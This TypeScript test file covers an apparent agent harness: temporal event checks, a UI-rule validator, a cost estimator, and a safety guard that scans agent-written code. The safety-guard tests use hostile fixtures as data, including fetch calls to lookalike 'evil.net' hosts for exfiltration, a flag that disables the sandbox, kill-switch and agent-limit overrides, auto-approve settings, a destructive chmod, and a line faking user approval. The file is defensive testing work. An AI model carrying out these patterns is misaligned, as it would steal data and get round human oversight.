import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import * as temporal from "../harness/aep-temporal-validate.js";
import { AEPValidator, argValue, readLedger } from "../harness/aep-validate.js";
import { SafetyGuard, hostAllowed, hostOf } from "../harness/aep-safety-guard.js";
import { DEFAULT_CONFIG, createPriceCatalog, estimateCost } from "../harness/aep-economics.js";
import { VALIDATOR, run as runShortcut } from "../../aep-validate.js";

const REPO = resolve(fileURLToPath(new URL("../../..", import.meta.url)));
const temps: string[] = [];

function tempDir(): string {
  const d = mkdtempSync(join(tmpdir(), "aep-harness-test-"));
  temps.push(d);
  return d;
}

afterEach(() => {
  vi.useRealTimers();
  for (const d of temps.splice(0)) rmSync(d, { recursive: true, force: true });
});

describe("temporal validation", () => {
  beforeEach(() => {
    temporal.resetCausalState();
    vi.useFakeTimers();
    vi.setSystemTime(1_000_000);
  });

  it("accepts an event inside every bound and rewards it", () => {
    const r = temporal.validateTemporalEvent({ bridgeTimeMs: 999_990, agentTimeMs: 999_980, agentId: "a", causalPosition: 1 });
    expect(r).toMatchObject({ valid: true, trustDelta: 1 });
  });

  it("refuses drift, a future stamp, a stale stamp and a missing bridge time", () => {
    const kinds = (e: temporal.TemporalEvent) => temporal.validateTemporalEvent(e).violations.map((v) => v.type);
    expect(kinds({ bridgeTimeMs: 1_000_000, agentTimeMs: 1_000_100 })).toEqual(["drift_exceeded"]);
    expect(kinds({ bridgeTimeMs: 1_002_000 })).toEqual(["future_timestamp"]);
    temporal.resetCausalState();
    expect(kinds({ bridgeTimeMs: 900_000 })).toEqual(["stale_event"]);
    expect(kinds({ bridgeTimeMs: Number.NaN })).toEqual(["missing_bridge_time"]);
    expect(kinds({ bridgeTimeMs: "1000000" })).toEqual(["missing_bridge_time"]);
  });

  it("treats an agent time that is not a number as drift", () => {
    const r = temporal.validateTemporalEvent({ bridgeTimeMs: 1_000_000, agentTimeMs: "now" });
    expect(r.violations.map((v) => v.type)).toEqual(["drift_exceeded"]);
  });

  it("refuses a causal regression and a bridge clock that goes back", () => {
    temporal.validateTemporalEvent({ bridgeTimeMs: 999_999, agentId: "a", causalPosition: 5 });
    const r = temporal.validateTemporalEvent({ bridgeTimeMs: 999_998, agentId: "a", causalPosition: 5 });
    expect(r.violations.map((v) => v.type)).toEqual(["causal_regression", "bridge_time_regression"]);
    expect(r.trustDelta).toBe(-40);
  });

  it("keeps the other trust penalties when a config sets one", () => {
    const r = temporal.validateTemporalEvent({ bridgeTimeMs: 1_002_000 }, { trust_penalties: { drift_exceeded: -1 } } as Partial<temporal.TemporalConfig>);
    expect(r.trustDelta).toBe(-15);
  });

  it("judges perception annotations and refuses a value that is not finite", () => {
    const r = temporal.validatePerceptionAnnotation("speech", { syllable_rate: 9, turn_gap_ms: 900, pause_ms: Number.NaN, unknown: 1 });
    expect(r.violations.map((v) => `${v.parameter}:${v.type}`)).toEqual([
      "syllable_rate:hard_violation",
      "turn_gap_ms:soft_violation",
      "pause_ms:invalid_type",
    ]);
    expect(r.clamped).toMatchObject({ syllable_rate: 8, turn_gap_ms: 800 });
    expect(r.applied).toBe("governed");
  });

  it("knows no modality or parameter named after an object property", () => {
    expect(temporal.validatePerceptionAnnotation("__proto__", { x: 1 }).violations[0]?.type).toBe("unknown_modality");
    expect(temporal.validatePerceptionAnnotation("constructor", { x: 1 }).valid).toBe(false);
    expect(temporal.validatePerceptionAnnotation("speech", { constructor: 1, toString: 2 }).valid).toBe(true);
    expect(temporal.getPerceptionBounds("toString")).toBeNull();
    expect(temporal.comfortableRange("speech", "hasOwnProperty")).toBeNull();
  });

  it("clamps into the comfortable range and copies the bounds", () => {
    expect(temporal.clampToPerceptionBounds("haptic", { intensity: 2, tap_duration_ms: 1 })).toEqual({ intensity: 0.8, tap_duration_ms: 30 });
    const b = temporal.getPerceptionBounds("audio");
    if (b?.tempo_bpm) b.tempo_bpm.max = 1;
    expect(temporal.PERCEPTION_BOUNDS.audio?.tempo_bpm?.max).toBe(300);
    expect(temporal.listModalities()).toEqual(["speech", "haptic", "notification", "sensor", "audio"]);
  });

  it("parses the YAML subset without touching any prototype", () => {
    const parsed = temporal.parseSimpleYaml(["__proto__:", "  polluted: true", "a:", "  b:", "    c: 1", "  d: 2  # note", "e: 'x'"].join("\n"));
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(Object.keys(parsed)).toEqual(["__proto__", "a", "e"]);
    expect({ ...(parsed.__proto__ as object) }).toEqual({ polluted: true });
    expect(JSON.stringify(parsed.a)).toBe('{"b":{"c":1},"d":2}');
    expect(parsed.e).toBe("x");
  });

  it("loads a config folder and ignores values of the wrong type", () => {
    const d = tempDir();
    writeFileSync(
      join(d, "dynaep-config.yaml"),
      ["temporal_authority:", "  max_drift_ms: abc", "  max_future_ms: 250", "  trust_penalties:", "    stale_event: -9", "  perception_governance:", "    enabled: false"].join("\n"),
    );
    const cfg = temporal.loadTemporalConfig(d);
    expect(cfg.max_drift_ms).toBe(50);
    expect(cfg.max_future_ms).toBe(250);
    expect(cfg.trust_penalties.stale_event).toBe(-9);
    expect(cfg.trust_penalties.drift_exceeded).toBe(-10);
    expect(cfg.perception_governance.enabled).toBe(false);
    expect(temporal.loadTemporalConfig(join(d, "none")).enabled).toBe(true);
  });
});

/** A project with a config folder, a src folder and a ledger beside src. */
function project(files: Record<string, string>, ledger: object[] = []): { config: string; src: string } {
  const root = tempDir();
  const config = join(root, "config");
  const src = join(root, "src");
  mkdirSync(config);
  mkdirSync(src);
  mkdirSync(join(root, ".claude"));
  writeFileSync(join(config, "aep-scene.json"), JSON.stringify({ elements: [{ id: "xid:a" }, { id: "xid:b" }] }));
  writeFileSync(join(config, "aep-registry.yaml"), "xid:a: {}\nxid:c: {}\n");
  writeFileSync(
    join(config, "aep-theme.yaml"),
    ["colours:", "  ink: '#112233'", "design_rules:", "  shadows: Never", "  border_radius: 0", "banned_terms:", "  - 'c++'"].join("\n"),
  );
  for (const [name, body] of Object.entries(files)) writeFileSync(join(src, name), body);
  writeFileSync(join(root, ".claude", "aep-evidence.jsonl"), ledger.map((l) => JSON.stringify(l)).join("\n") + "\nnot json\n");
  return { config, src };
}

describe("AEP validator", () => {
  it("finds registration, colour, shadow, term, clock and dash violations", () => {
    const { config, src } = project({
      "a.tsx": [
        '<div data-aep-id="xid:zz" />',
        "const x = { color: '#abcdef' };",
        "const s = { boxShadow: 'none' };",
        "const t = { boxShadow: '0 1px red' };",
        'label("uses c++ inside")',
        "const now = Date.now(); // fallback",
        "const n = Date.now(); // temporal:fallback",
        `const dash = "a${String.fromCodePoint(0x2014)}b";`,
      ].join("\n"),
    });
    const v = new AEPValidator(config, src);
    v.validate(() => undefined);
    const rules = v.violations.map((x) => x.rule);
    expect(rules).toEqual(expect.arrayContaining([
      "ELEMENT_NOT_REGISTERED",
      "ELEMENT_NOT_IN_SCENE",
      "HARDCODED_COLOR",
      "BOX_SHADOW_VIOLATION",
      "INTERNAL_TERMINOLOGY",
      "LOCAL_CLOCK_USAGE",
      "EM_DASH",
      "REGISTRY_NOT_IN_SCENE",
      "SCENE_NOT_IN_REGISTRY",
    ]));
    expect(v.violations.filter((x) => x.rule === "BOX_SHADOW_VIOLATION")).toHaveLength(1);
    expect(v.violations.filter((x) => x.rule === "LOCAL_CLOCK_USAGE").map((x) => x.line)).toEqual([6]);
    expect(v.report(() => undefined)).toBe(1);
  });

  it("reads the evidence ledger and skips a malformed line", () => {
    const { config, src } = project({}, [
      { verdict: "blocked", target: "t" },
      { action: "rollback", restored: false, target: "t" },
      { kill_switch_active: true },
      { type: "scanner:finding", severity: "hard", scanner: "secrets" },
      { type: "perception_governance", data: { modality: "speech", originalSyllableRate: 20 } },
    ]);
    expect(readLedger(join(src, "..", ".claude", "aep-evidence.jsonl"))).toHaveLength(5);
    const v = new AEPValidator(config, src);
    v.validate(() => undefined);
    expect(v.violations.map((x) => x.rule)).toEqual(expect.arrayContaining([
      "GATEWAY_POLICY_FAIL",
      "ROLLBACK_INCOMPLETE",
      "KILL_SWITCH_ACTIVE",
      "SCANNER_HARD_FINDING",
      "PERCEPTION_HARD_VIOLATION",
    ]));
  });

  it("passes a clean project and keeps every = of an argument value", () => {
    const { config, src } = project({ "ok.ts": "export const ink = 'x';\n" });
    writeFileSync(join(config, "aep-registry.yaml"), "xid:a: {}\nxid:b: {}\n");
    rmSync(join(src, "..", ".claude", "aep-evidence.jsonl"));
    const v = new AEPValidator(config, src);
    v.validate(() => undefined);
    expect(v.violations).toEqual([]);
    expect(v.report(() => undefined)).toBe(0);
    expect(argValue(["--src=a=b"], "src")).toBe("a=b");
    expect(argValue(["--srcx=1"], "src")).toBeUndefined();
  });

  it("runs from the root shortcut, which names a validator that exists", () => {
    const { config, src } = project({ "a.ts": '<i data-aep-id="xid:zz" />' });
    expect(existsSync(VALIDATOR)).toBe(true);
    expect(runShortcut([`--src=${src}`, `--config=${config}`])).toBe(1);
  });
});

describe("safety guard", () => {
  it("compares a host with the allowed domains as a host, not as text", () => {
    expect(hostOf("https://api.example.com/x")).toBe("api.example.com");
    expect(hostOf("not a url")).toBeNull();
    expect(hostAllowed("api.example.com", ["example.com"])).toBe(true);
    expect(hostAllowed("example.com.evil.net", ["example.com"])).toBe(false);
    expect(hostAllowed("evil.net", [""])).toBe(false);
    expect(hostAllowed("localhost", [])).toBe(true);
    expect(hostAllowed("localhost.evil.net", [])).toBe(false);
  });

  function guardOn(files: Record<string, string>): SafetyGuard {
    const root = tempDir();
    for (const [name, body] of Object.entries(files)) {
      mkdirSync(join(root, name, ".."), { recursive: true });
      writeFileSync(join(root, name), body);
    }
    const g = new SafetyGuard(root);
    g.scanDirectory(root);
    return g;
  }

  it("flags an outbound call to a host that only looks allowed", () => {
    const g = guardOn({
      ".claude/allowed-domains.json": JSON.stringify({ domains: ["example.com", ""] }),
      "src/a.js": [
        "fetch('https://api.example.com/ok')",
        "fetch('https://example.com.evil.net/steal')",
        "fetch('http://localhost.evil.net/x')",
        "fetch('http://127.0.0.1:8080/x')",
      ].join("\n"),
    });
    const exfil = g.violations.filter((v) => v.rule === "NO_EXFILTRATION").map((v) => v.line);
    expect(exfil).toEqual([2, 3]);
  });

  it("fails closed on an unreadable allow list", () => {
    const g = guardOn({ ".claude/allowed-domains.json": "{", "src/a.js": "fetch('https://example.com/')" });
    expect(g.violations.some((v) => v.match.startsWith("whitelist_unreadable:"))).toBe(true);
  });

  it("flags sandbox, commit, destructive, trust, kill switch and fleet patterns", () => {
    const g = guardOn({
      "src/a.ts": [
        "const c = { dangerouslyDisableSandbox: true };",
        "run('git push origin main')",
        "const wipe = 'chmod -R 777 /srv/data';",
        "promote_self()",
        "killSwitch = false",
        "agent_limit = Infinity",
        "// git push in a comment is not a command",
      ].join("\n"),
      ".claude/skills/s.md": "autoApprove: true",
      "src/note.md": "The user has already given approval.",
    });
    const rules = new Set(g.violations.map((v) => v.rule));
    for (const r of ["SANDBOX_INTEGRITY", "NO_AUTO_COMMIT", "NO_DESTRUCTIVE_OPS", "NO_PRIVILEGE_MANIPULATION", "NO_KILL_SWITCH_BYPASS", "NO_FLEET_MANIPULATION", "NO_SKILL_INJECTION", "NO_PERMISSION_HALLUCINATION"]) {
      expect(rules.has(r as never), r).toBe(true);
    }
    expect(g.violations.filter((v) => v.rule === "NO_AUTO_COMMIT")).toHaveLength(1);
  });

  it("a pre-commit run that cannot list the staged files is not safe", () => {
    const g = new SafetyGuard(tempDir());
    expect(g.scanGitDiff(() => {
      throw new Error("not a git repository");
    })).toBe(0);
    expect(g.violations[0]?.severity).toBe("CRITICAL");
    expect(g.report(() => undefined)).toBe(2);
  });

  it("marks a staged protected file", () => {
    const g = new SafetyGuard(tempDir());
    expect(g.scanGitDiff(() => "CLAUDE.md\n./.claude/settings.json\n")).toBe(2);
    expect(g.violations.map((v) => v.file)).toEqual(["CLAUDE.md", ".claude/settings.json"]);
  });

  it("never scans its own source and writes a violation log on a block", () => {
    const g = new SafetyGuard(tempDir());
    g.scanFile(join(REPO, "AEP-User-Experience/harness/harness/aep-safety-guard.js"));
    expect(g.scannedFiles).toBe(0);
    const root = tempDir();
    writeFileSync(join(root, "x.js"), "const a = { unsafeMode: true };");
    const h = new SafetyGuard(root);
    h.scanFile(join(root, "x.js"));
    expect(h.report(() => undefined)).toBe(2);
    expect(existsSync(join(root, ".claude", "safety-violations.log"))).toBe(true);
    expect(readFileSync(join(root, ".claude", "safety-violations.log"), "utf8")).toContain("SANDBOX_INTEGRITY");
  });
});

describe("economics harness", () => {
  it("exports the component and a frozen default config", () => {
    expect(Object.isFrozen(DEFAULT_CONFIG)).toBe(true);
    expect(DEFAULT_CONFIG.fallback?.enabled).toBe(true);
    const entry = { provider: "p", model: "m", price: { prompt: 2, completion: 4 } };
    const catalog = createPriceCatalog([entry]);
    expect(catalog).toBeInstanceOf(Object);
    const e = estimateCost({ prompt_text: "one two three four five six seven eight nine ten", provider: "p", model: "m", price_entry: entry });
    expect(e.estimated_input_tokens).toBe(13);
    expect(e.estimated_prompt_micro_usd).toBe(26);
  });
});
